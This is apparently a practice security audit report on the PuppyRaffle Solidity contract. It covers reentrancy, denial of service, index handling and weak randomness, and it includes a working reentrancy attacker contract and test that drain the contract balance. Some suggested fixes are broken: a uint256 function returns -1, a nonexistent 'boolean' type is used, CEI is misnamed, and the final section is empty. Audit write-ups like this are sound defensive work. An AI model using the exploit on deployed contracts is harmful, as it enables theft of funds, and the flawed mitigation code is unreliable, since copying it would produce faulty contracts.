### [H-01] Deleting the player from `PuppyRaffle::players` array after refunding them entranceFee in `PuppyRaffle::refund()` results in Reentrancy vulnerability, draining the contract balance.

**Description:** `PuppyRaffle::refund()` allows players to refund their deposits by initiating external call first and subsequently setting the user's address to zero in `PuppyRaffle::players()` . This introduces a vulnerability to Reentrancy attack, where attacker could deploy a contract with a malicious fallback() function to retrigger`PuppyRaffle::refund()`. Since user remains in `PuppyRaffle::players()` at this point, they would successfully pass all checks, leading to repeated executions of sendValue, ultimately draining the contract.

```javascript
@>      payable(msg.sender).sendValue(entranceFee); // Reentrancy here
        players[playerIndex] = address(0);
```

**Impact:** The reentrancy vulnerability could result in a significant drain on contract's balance, potentially leading to financial losses for the contract owner and participants.

**Proof of Concept:** We set up an ReentrancyAttack contract with a malicious receive() function, have it enter PuppyRaffle with 4 other players and call refund() on it, with the following result,

- *puppyRaffle balance before attack: 5000000000000000000*
- *attackContract balance before attack: 0*
- *puppyRaffle balance after attack: 0*
- *attackContract balance after attack: 5000000000000000000*

<details>

<summary>Code</summary>

```javascript

    function testReentrancyInRefundFunction() public playersEntered {
        address alice = makeAddr("alice");
        deal(alice, 1 ether);
        vm.prank(alice);
        ReentrancyAttacker attacker = new ReentrancyAttacker{value: 1 ether}(address(puppyRaffle));

        address[] memory arr = new address[](1);
        arr[0] = address(attacker);
        
        vm.prank(address(attacker));
        puppyRaffle.enterRaffle{value:entranceFee}(arr);

        console.log("puppyRaffle balance before attack: %s", address(puppyRaffle).balance);
        console.log("attackContract balance before attack: %s", address(attacker).balance);

        assertEq(address(puppyRaffle).balance, 5 ether);
        assertEq(address(attacker).balance, 0);

        vm.prank(alice);
        attacker.setIdx();

        vm.startPrank(address(attacker));
        uint256 idx = puppyRaffle.getActivePlayerIndex(address(attacker));
        puppyRaffle.refund(idx);
        vm.stopPrank();

        console.log("puppyRaffle balance after attack: %s", address(puppyRaffle).balance);
        console.log("attackContract balance after attack: %s", address(attacker).balance);
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attacker).balance, 5 ether);

    }

    contract ReentrancyAttacker {
        PuppyRaffle public raffle;
        uint256 constant entranceFee = 1e18;
        uint256 public idx;

        address private owner;

        modifier onlyOwner() {
            require(msg.sender == owner, "You are not the owner");
            _;
        }

        constructor(address _raffle) payable {
            raffle = PuppyRaffle(_raffle);
            owner = msg.sender;
        }

        function setIdx() external onlyOwner {
            idx = raffle.getActivePlayerIndex(address(this));
        }

        receive() external payable {
            if (address(raffle).balance > 0) {
                raffle.refund(idx);
            }
        }
    }

```
</details>


**Recommended Mitigation:** You can go for one of the following counter measures,

1. Follow the CEI (Cases, Effects, Interactions) pattern. For the  `PuppyRaffle::refund()`, cover the checks first. Set the states after that. Make external calls at the end.
```diff

    function refund(uint256 playerIndex) public {
+           // Checks
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+           // Effects
+           players[playerIndex] = address(0);

+           // External Calls
            payable(msg.sender).sendValue(entranceFee);

-           players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
        }

```

2. Consider using NonReentrant() modifier provided by OpenZeppelin contract.

```diff
+   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

-   contract PuppyRaffle {
+   contract PuppyRaffle is ReentrancyGuard {
    // Rest of the code

-    function refund(uint256 playerIndex) public {}
+    function refund(uint256 playerIndex) public nonReentrant {}

    // Rest of the code
    }

```



### [M-01] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle()` function is a potential Denial-of-service (DoS) attack, incrementing gas costs for future players.

**Description:** The `PuppyRaffle::enterRaffle()` function checks for address duplicates using an unbounded for-loop which causes gas-costs to blow up, since the longer the `PuppyRaffle::players` array is, the more checks new players will have to make. This means, gas costs for players entering the raffle when the Raffle starts will be dramatically lower than those who enter later. Every additional address that gets added to players array results in additional duplicate address check that loop will have to make.

```javascript
    // DoS here due to unbounded for-loop
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }

```

**Impact:** The gas costs for entrants will greatly increases as more players join the raffle, discouraging later users from entering, causing a rush when Raffle starts, to be one of the first entrants.

**Proof of Concept:** If we have two sets of 100 players enter, the gas costs would be,

- *Gas consumed by 100 players: 6385604*
- *Gas consumed by next 100 players: 18387894*

<details>
<summary>PoC</summary>

Place the following test into `PuppyRaffleTest.t.sol`

```javascript

function testDosOnEnterRaffle() public {
    address playerZero = address(uint160(1000));
    deal(playerZero, 1 ether);
    address[] memory players = new address[](1);
    players[0] = playerZero;
    vm.prank(playerZero);
    puppyRaffle.enterRaffle{value: entranceFee * 1}(players);

    address alice = makeAddr("alice");
    deal(alice, 1 ether);


    address[] memory players2 = new address[](1);
    uint256 gasStartAlice = gasleft();
    players2[0] = alice;
    vm.prank(alice);
    puppyRaffle.enterRaffle{value: entranceFee * 1}(players2);
    uint256 gasLeftAlice = gasStartAlice - gasleft();

    // Adding 100 player to the bunch
    address[] memory playerx = new address[](100);
    for (uint256 idx; idx < playerx.length; idx++) {
        address play__er = address(uint160(idx));
        playerx[idx] = play__er;
    }
    uint256 gasStartCris = gasleft();
    address cris = makeAddr("cris");
    deal(cris, 100 ether);
    vm.prank(cris);  
    puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerx);
    uint256 gasLeftCris = gasStartCris - gasleft();


    // Gas consumed by next 100 players
    uint256 count = 0;
    address[] memory playerz = new address[](100);
    for (uint256 idx; idx < playerz.length; idx++) {
        address play__er = address(uint160(idx+playerz.length));
        playerz[count] = play__er;
        count += 1;
    }

    uint256 gasStartDock = gasleft();
    address Dock = makeAddr("Dock");
    deal(Dock, 100 ether);
    vm.prank(Dock);  
    puppyRaffle.enterRaffle{value: entranceFee * playerx.length}(playerz);
    uint256 gasLeftDock = gasStartDock - gasleft();


    console.log("Gas consumed by alice: %s", gasLeftAlice);
    console.log("Gas consumed by 100 players: %s", gasLeftCris);
    console.log("Gas consumed by next 100 players: %s", gasLeftDock);

    assertLt(gasLeftAlice, gasLeftCris);
    assertLt(gasLeftCris, gasLeftDock);
}

```
</details>

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing the duplicates. Users can make new wallet addresses anyways, so a duplicate check does not prevent the same person from entering twice using different wallet address. It only checks for same wallet address.
2. Consider using mapping to check for duplicates. This would allow constant lookup for whether there is a duplicate or not.

```diff

+   mapping(address => boolean) public addressExists;

    function enterRaffle(address[] memory newPlayers) public payable {
+       // Check for duplicates
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressExists[newPlayers[i]] != true, "PuppyRaffle: Duplicate player");
+       }
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressExists[newPlayers[i]] = true;
        }

        // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

    function selectWinner() external {
+    // Empty out the addressExists

        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        // Rest of the code...
    }

```

### [l-01] `PuppyRaffle::getActivePlayerIndex()` returning 0 for inactive players can mislead an active user at index 0, thereby undermining intended functionlity of the function. 

**Description:**  The `PuppyRaffle::getActivePlayerIndex()` incorrectly indicates that a user is inactive by returning 0 if they are not found in `PuppyRaffle::players` array. This behavior poses a problem because it can mislead an active user at index 0 into believing that they are inactive, thereby preventing them from triggering a refund. This undermines the intended functionality of the function, as it should accurately identify active users for a refund.

**Impact:** This has significant implications for fairness of the PuppyRaffle contract. Any user at index 0 could be erroneously denied an opportunity to trigger a refund, which undermines contract fairness and user experience.

**Recommended Mitigation:** Consider modifying the `PuppyRaffle::getActivePlayerIndex()` function to return a value that clearly indicates when a user is not found in the `PuppyRaffle::players` array. One common approach is to use a sentinel value, such as a `-1` to represent "Not found" or "inactive".

```diff
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }

+       return -1;
-       return 0;
    }

```

### [l-02] Weak randomness generation in `PuppyRaffle::selectWinner()` that is exploitable by miner, making it predictable and taking away the randomness from the function.

**Description:** The winner is selected by relying on user address, block timestamp and block difficulty in `PuppyRaffle::selectWinner()`. This approach presents a vulnerability that can be exploited by a miner. By manipulating the timestamp, difficulty and mining for an address that would allow them to predict the outcome of the selection process, compromising the randomness and fairness of the function.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
@>       uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        // Rest of the code
    }
```

**Impact:** A malicious miner can manipulate the outcome, rigging the results in favor of themselves or others, compromising the trust of participants and authenticity, leading to reputational damage.

**Proof of Concept:**

**Recommended Mitigation:** 